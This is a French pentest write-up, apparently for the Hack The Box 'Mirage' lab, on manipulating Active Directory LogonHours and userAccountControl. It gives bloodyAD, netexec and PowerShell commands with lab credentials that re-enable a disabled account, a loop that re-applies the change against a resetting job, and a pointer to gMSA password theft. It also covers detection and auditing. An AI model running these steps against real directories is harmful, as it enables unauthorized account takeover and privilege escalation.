# Manipulation des LogonHours

#### <mark style="color:blue;">🎯 Principe de l'attaque</mark>

**LogonHours** est un attribut Active Directory qui définit les plages horaires pendant lesquelles un utilisateur peut se connecter. Si cet attribut est vide ou mal configuré, l'utilisateur ne peut **jamais** se connecter, même avec un mot de passe valide.

```
┌──────────────────────────────────────────┐
│  LOGONHOURS - Plages horaires            │
├──────────────────────────────────────────┤
│                                          │
│  21 bytes = 168 bits (7 jours × 24h)    │
│                                          │
│  Chaque bit = 1 heure                    │
│  1 = connexion autorisée                │
│  0 = connexion refusée                   │
│                                          │
│  Vide/NULL = AUCUNE connexion autorisée  │
│  0xFF (tous à 1) = Toujours autorisé     │
│                                          │
└──────────────────────────────────────────┘
```

#### <mark style="color:blue;">📋 Format des LogonHours</mark>

**Structure technique :**

```
21 bytes = 168 bits

Byte 0  : Dimanche   00:00-07:59 (8 heures)
Byte 1  : Dimanche   08:00-15:59 (8 heures)
Byte 2  : Dimanche   16:00-23:59 (8 heures)
Byte 3  : Lundi      00:00-07:59
...
Byte 20 : Samedi     16:00-23:59

Valeur complète (24/7):
0xFF × 21 = ////////////////////////////
(Base64 de 21 bytes de 0xFF)
```

**En hexadécimal :**

```bash
# 21 bytes tous à 0xFF (autorisé 24/7)
FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
```

**En base64 :**

```bash
# Encoder 21 bytes de 0xFF
echo -n -e '\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' | base64

# Résultat:
////////////////////////////
```

#### <mark style="color:blue;">🔍 Identification du problème</mark>

**Symptômes**

**1. Erreur de connexion**

```bash
netexec smb DC01.mirage.htb \
    -u javier.mmarshall \
    -p 'NewPassword123!' \
    -k

# Output:
[-] mirage.htb\javier.mmarshall:NewPassword123! KDC_ERR_CLIENT_REVOKED
     ↑
     Compte révoqué/désactivé
```

**2. Vérifier avec bloodyAD**

```bash
# Voir les attributs de l'utilisateur
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -u mark.bbond \
    -p '1day@atime' \
    -k \
    get object javier.mmarshall | grep -i -e logonHours -e userAccountControl

# Output problématique:
logonHours:                              # ← VIDE!
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
                    ↑
                    Compte désactivé
```

**3. Vérifier avec PowerShell**

```powershell
Get-ADUser -Identity javier.mmarshall -Properties LogonHours, userAccountControl

# Output:
LogonHours        : {}        # ← Vide = Jamais autorisé
userAccountControl : 66050    # ← Bit ACCOUNTDISABLE activé
```

#### <mark style="color:blue;">🛠️ Exploitation - Correction des LogonHours</mark>

**Méthode 1: bloodyAD (Linux - SIMPLE)**

**Étape 1: Supprimer le flag ACCOUNTDISABLE**

```bash
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -u mark.bbond \
    -p '1day@atime' \
    -k \
    remove uac javier.mmarshall -f ACCOUNTDISABLE

# Output:
[+] ['ACCOUNTDISABLE'] property flags removed from javier.mmarshall's userAccountControl
```

**Étape 2: Définir les LogonHours (24/7)**

```bash
# Option 1: Avec la nouvelle version de bloodyAD (PR #154)
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -u mark.bbond \
    -p '1day@atime' \
    -k \
    set object javier.mmarshall logonHours -v '////////////////////////////' --b64

# Output:
[+] javier.mmarshall's logonHours has been updated

# Option 2: Si l'option --b64 n'existe pas, utiliser PowerShell
```

**Vérification :**

```bash
# Vérifier les attributs
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -u mark.bbond \
    -p '1day@atime' \
    -k \
    get object javier.mmarshall | grep -i logonHours

# Output:
logonHours: ////////////////////////////  # ← Bon!

# Tester la connexion
netexec smb DC01.mirage.htb \
    -u javier.mmarshall \
    -p 'NewPassword123!' \
    -k

# Output:
[+] mirage.htb\javier.mmarshall:NewPassword123!  # ← Fonctionne!
```

**Méthode 2: PowerShell (Windows/WinRM)**

**Script complet :**

```powershell
# 1. Se connecter comme mark.bbond (qui a les droits)
$pass = ConvertTo-SecureString '1day@atime' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('mirage\mark.bbond', $pass)

# 2. Récupérer les LogonHours d'un utilisateur valide (pour copier)
$validUser = Get-ADUser -Identity mark.bbond -Credential $cred -Properties LogonHours
$logonHours = $validUser.LogonHours

# Afficher les bytes (pour debug)
$logonHours | Format-Hex
# Output: 21 bytes de 0xFF

# 3. Appliquer au compte cible
Set-ADUser -Identity javier.mmarshall `
    -Credential $cred `
    -Replace @{LogonHours = $logonHours}

# 4. Retirer le flag ACCOUNTDISABLE
Set-ADUser -Identity javier.mmarshall `
    -Credential $cred `
    -Enabled $true

# 5. Vérifier
Get-ADUser -Identity javier.mmarshall `
    -Credential $cred `
    -Properties LogonHours, Enabled | 
    Select-Object SamAccountName, Enabled, LogonHours

# Output:
# SamAccountName    Enabled LogonHours
# --------------    ------- ----------
# javier.mmarshall  True    {255, 255, 255, 255...}
```

**Version condensée :**

```powershell
# Tout en une ligne (après avoir créé $cred)
$lh = (Get-ADUser mark.bbond -Credential $cred -Properties LogonHours).LogonHours
Set-ADUser javier.mmarshall -Credential $cred -Replace @{LogonHours = $lh} -Enabled $true
```

**Méthode 3: Création manuelle des bytes**

**Si besoin de créer les bytes manuellement :**

```powershell
# Créer un tableau de 21 bytes à 0xFF
$logonHours = @(0xFF) * 21

# Convertir en byte array
$logonHoursBytes = [byte[]]$logonHours

# Appliquer
Set-ADUser -Identity javier.mmarshall -Replace @{LogonHours = $logonHoursBytes}
```

**En Python (génération) :**

```python
import base64

# 21 bytes de 0xFF
logon_hours = b'\xff' * 21

# Base64 pour bloodyAD
b64_logon_hours = base64.b64encode(logon_hours).decode()
print(b64_logon_hours)
# Output: ////////////////////////////
```

#### <mark style="color:blue;">🔍 Cas d'usage spécifiques</mark>

**Restreindre les heures de connexion (défense)**

**Autoriser seulement les heures de bureau (8h-18h, Lun-Ven) :**

```powershell
# Créer un tableau de 21 bytes initialisé à 0x00 (rien autorisé)
$logonHours = @(0x00) * 21

# Définir les heures autorisées
# Lundi à Vendredi = bytes 3 à 17
# 08:00-17:59 = bits 8 à 17 (2e et 3e byte de chaque jour)

# Lundi
$logonHours[3] = 0x00  # 00:00-07:59 (non autorisé)
$logonHours[4] = 0xFF  # 08:00-15:59 (autorisé)
$logonHours[5] = 0xC0  # 16:00-17:59 autorisé, 18:00-23:59 non

# Répéter pour Mardi à Vendredi (bytes 6-17)
for ($i = 6; $i -le 17; $i += 3) {
    $logonHours[$i] = 0x00
    $logonHours[$i+1] = 0xFF
    $logonHours[$i+2] = 0xC0
}

# Appliquer
Set-ADUser -Identity contractor_account -Replace @{LogonHours = [byte[]]$logonHours}
```

**Désactiver complètement les connexions**

```powershell
# Tous les bytes à 0x00 = aucune connexion possible
$noLogon = @(0x00) * 21
Set-ADUser -Identity suspicious_account -Replace @{LogonHours = [byte[]]$noLogon}
```

#### 🚨 Dépannage

**Problème 1: Attribut non mis à jour**

**Symptôme :**

```powershell
Set-ADUser javier.mmarshall -Replace @{LogonHours = $lh}
# Pas d'erreur mais ne fonctionne pas
```

**Solution :**

```powershell
# Forcer avec Clear puis Set
Set-ADUser javier.mmarshall -Clear LogonHours
Start-Sleep -Seconds 2
Set-ADUser javier.mmarshall -Replace @{LogonHours = $lh}
```

**Problème 2: Compte toujours désactivé**

**Vérifier TOUS les indicateurs :**

```powershell
Get-ADUser javier.mmarshall -Properties * | Select-Object `
    SamAccountName,
    Enabled,                    # Doit être True
    AccountExpirationDate,      # Doit être null ou future
    LockedOut,                  # Doit être False
    PasswordExpired,            # Doit être False
    LogonHours                  # Doit être rempli
```

**Problème 3: Cron qui réinitialise**

**Dans Mirage, un cron réinitialise toutes les X minutes :**

```bash
# Surveiller les changements
while true; do
    bloodyAD -d mirage.htb \
        --host DC01.mirage.htb \
        -u mark.bbond -p '1day@atime' -k \
        get object javier.mmarshall --attr logonHours
    sleep 60
done

# Dès que ça se vide, remettre immédiatement:
bloodyAD -d mirage.htb \
    --host DC01.mirage.htb \
    -u mark.bbond -p '1day@atime' -k \
    set object javier.mmarshall logonHours -v '////////////////////////////' --b64
```

#### 🔒 Sécurité

**Détection de manipulation :**

```powershell
# Event ID 4738: User account changed
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4738
} | Where-Object {
    $_.Message -match "Logon Hours"
}

# Alerter sur:
# - Modifications de LogonHours en dehors des heures de bureau
# - Passage de NULL à autorisé 24/7
# - Comptes sensibles dont les LogonHours changent
```

**Audit régulier :**

```powershell
# Lister les comptes avec LogonHours anormaux
Get-ADUser -Filter * -Properties LogonHours | Where-Object {
    $_.LogonHours -eq $null -or
    ($_.LogonHours | Where-Object {$_ -ne 0xFF}).Count -eq 0
} | Select-Object SamAccountName, LogonHours
```

#### <mark style="color:blue;">💡 Dans le contexte Mirage</mark>

```
Problème avec javier.mmarshall:

1. Après ForceChangePassword:
   netexec → KDC_ERR_CLIENT_REVOKED

2. Diagnostic:
   bloodyAD get object javier.mmarshall
   ├─> logonHours: (vide)
   └─> userAccountControl: ACCOUNTDISABLE

3. Fix étape 1 - UAC:
   bloodyAD remove uac javier.mmarshall -f ACCOUNTDISABLE

4. Fix étape 2 - LogonHours (PowerShell sur WinRM):
   $cred = Get-Credential mark.bbond
   $lh = (Get-ADUser mark.bbond -Cred $cred -Properties LogonHours).LogonHours
   Set-ADUser javier.mmarshall -Cred $cred -Replace @{LogonHours = $lh}

5. Validation:
   netexec smb DC01.mirage.htb -u javier.mmarshall -p 'password' -k
   [+] mirage.htb\javier.mmarshall  ✓

6. Exploitation:
   javier.mmarshall a ReadGMSAPassword → Mirage-Service$
```

***
